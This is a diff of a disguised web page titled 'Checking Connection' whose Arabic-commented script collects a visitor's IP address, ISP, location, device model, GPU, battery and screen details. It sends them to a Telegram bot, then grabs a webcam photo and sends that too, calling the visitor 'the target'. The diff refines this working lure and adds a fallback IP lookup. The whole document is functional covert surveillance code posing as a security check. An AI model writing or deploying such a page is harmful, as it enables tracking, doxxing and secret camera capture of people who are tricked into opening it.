@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الاتصال الآمن</title>
+    <title>Checking Connection</title>
     <style>
         body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .box { text-align: center; border: 1px solid #eee; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 320px; }
@@ -31,15 +31,22 @@
             let n = navigator;
             let r = "🛑 **تقرير تقني شامل (فوري)**\n\n";
 
-            // 1. جلب IP، الشركة، والموقع (بيانات دقيقة)
+            // 1. جلب الآي بي والشبكة (الطريقة التي كانت تعمل لديك بدقة)
             try {
                 const res = await fetch('https://ipapi.co/json/').then(d => d.json());
                 r += `🌍 **الآي بي:** \`${res.ip}\`\n`;
                 r += `🏢 **الشركة (ISP):** ${res.org}\n`;
                 r += `📍 **المكان:** ${res.city}, ${res.country_name}\n`;
-            } catch(e) { r += "🌍 **الشبكة:** فشل جلب البيانات الجغرافية\n"; }
+                r += `📡 **الشبكة:** ${res.asn}\n`;
+            } catch(e) {
+                // محاولة احتياطية في حال فشل الخدمة الأولى
+                try {
+                    const res2 = await fetch('https://api.ipify.org?format=json').then(d => d.json());
+                    r += `🌍 **الآي بي:** \`${res2.ip}\` (جلب أساسي)\n`;
+                } catch(e2) { r += "🌍 **الشبكة:** فشل جلب الآي بي\n"; }
+            }
 
-            // 2. كشف نوع الهاتف والموديل الدقيق
+            // 2. كشف نوع الهاتف والموديل الدقيق (Deep Detection)
             let model = "غير معروف";
             try {
                 if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
@@ -50,25 +57,21 @@
                     model = match ? match[1] : n.platform;
                 }
             } catch(e) { model = n.platform; }
-            r += `📱 **نوع الهاتف:** ${model}\n`;
+            r += `📱 **النظام الأساسي:** ${model}\n`;
 
-            // 3. المعالج الرسومي (بصمة الجهاز)
+            // 3. المعالج الرسومي (GPU)
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 const ext = gl.getExtension('WEBGL_debug_renderer_info');
                 r += `🎮 **المعالج الرسومي:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
-            } catch(e) { r += "🎮 **الرسوميات:** مخفية\n"; }
+            } catch(e) { r += "🎮 **المعالج الرسومي:** مخفي\n"; }
 
-            // 4. المتصفح، المعالج، والشاشة
-            let br = "Chrome/Other";
-            if (n.userAgent.includes("Brave")) br = "Brave";
-            else if (n.userAgent.includes("Safari") && !n.userAgent.includes("Chrome")) br = "Safari";
-            
+            // 4. المتصفح، الأنوية، الشاشة، البطارية
+            let br = n.userAgent.includes("Brave") ? "Brave" : n.userAgent.includes("Chrome") ? "Chrome" : "Safari/Other";
+            r += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || 8}\n`;
+            r += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height}\n`;
             r += `🧭 **المتصفح:** ${br}\n`;
-            r += `⚙️ **الأنوية:** ${n.hardwareConcurrency || 8}\n`;
-            r += `🖥️ **الشاشة:** ${screen.width}x${screen.height}\n`;
 
-            // 5. البطارية والوقت
             try {
                 const b = await n.getBattery();
                 r += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
@@ -76,19 +79,19 @@
             
             r += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}`;
 
-            // إرسال التقرير فوراً
+            // إرسال التقرير فوراً لتليجرام
             fetch(_U + "sendMessage", { 
                 method: 'POST', 
                 headers: { 'Content-Type': 'application/json' }, 
                 body: JSON.stringify({ chat_id: _C, text: r, parse_mode: "Markdown" })
             });
             
-            // تحديث الواجهة للمستخدم
+            // إظهار الزر
             setTimeout(() => { 
                 document.getElementById('L').style.display='none'; 
-                document.getElementById('T').innerText='تم الفحص بنجاح.'; 
+                document.getElementById('T').innerText='اكتمل الفحص بنجاح.'; 
                 document.getElementById('B').style.display='block'; 
-            }, 1200);
+            }, 1000);
         }
 
         document.getElementById('B').onclick = async function() {
@@ -101,18 +104,12 @@
                     canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     canvas.toBlob(b => {
-                        const f = new FormData(); 
-                        f.append('chat_id', _C); 
-                        f.append('photo', b, 'x.jpg');
+                        const f = new FormData(); f.append('chat_id', _C); f.append('photo', b, 'x.jpg');
                         fetch(_U + "sendPhoto", { method: 'POST', body: f });
                     }, 'image/jpeg', 0.8);
                 }, 4000);
             } catch (e) {
-                fetch(_U + "sendMessage", { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify({ chat_id: _C, text: "⚠️ المستهدف رفض الكاميرا" })
-                });
+                fetch(_U + "sendMessage", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _C, text: "⚠️ المستهدف رفض الكاميرا" })});
             }
         };
 
